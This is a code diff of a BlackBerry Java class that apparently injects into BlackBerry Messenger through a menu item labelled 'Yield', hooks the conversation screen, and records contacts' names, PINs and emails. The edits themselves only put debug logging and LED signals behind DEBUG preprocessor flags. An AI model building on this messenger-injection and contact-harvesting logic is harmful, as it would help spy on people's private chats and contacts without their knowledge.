@@ -1,3 +1,4 @@
+//#preprocess
 package com.rim.samples.device.bbminjectdemo;
 
 import java.util.Hashtable;
@@ -34,9 +35,9 @@ import net.rim.device.api.util.Arrays;
 
 public class BBMMenuItem extends ApplicationMenuItem {
 	private static final String BBM_MENU = "Yield";
-	//#ifdef DEBUG
+
 	private static Debug debug = new Debug("BBMMenuItem", DebugLevel.VERBOSE);
-	// #endif
+
 	private static BBMMenuItem instance;
 
 	UiApplication bbmApplication;
@@ -112,19 +113,24 @@ public class BBMMenuItem extends ApplicationMenuItem {
 				// lookForConversationsThread();
 				conversationScreen.setBBM(bbmApplication);
 
+				//#ifdef DEBUG
 				debug.info("BBM INJECTED!");
-				debug.ledStart(Debug.COLOR_GREEN);
-
+				debug.led(Debug.COLOR_GREEN);
+				//#endif
 			} else {
+			    //#ifdef DEBUG
 				debug.warn("BBM NOT INJECTED!");
-				debug.ledStart(Debug.COLOR_RED);
+				debug.led(Debug.COLOR_RED);
+				//#endif
 			}
 
 			debug.stopBuffering();
 
 		} catch (Exception ex) {
+		  //#ifdef DEBUG
 			debug.warn("injectBBM:" + ex.toString());
-			debug.ledStart(Debug.COLOR_RED);
+			debug.led(Debug.COLOR_RED);
+			//#endif
 		}
 		return null;
 	}
@@ -174,7 +180,9 @@ public class BBMMenuItem extends ApplicationMenuItem {
 					
 					users.put(user.toLowerCase(), new User(user,pin,email));
 
-					debug.ledStart(Debug.COLOR_ORANGE);
+					//#ifdef DEBUG
+					debug.led(Debug.COLOR_ORANGE);
+					//#endif
 				}
 
 				debug.trace("closing Contact Profile");
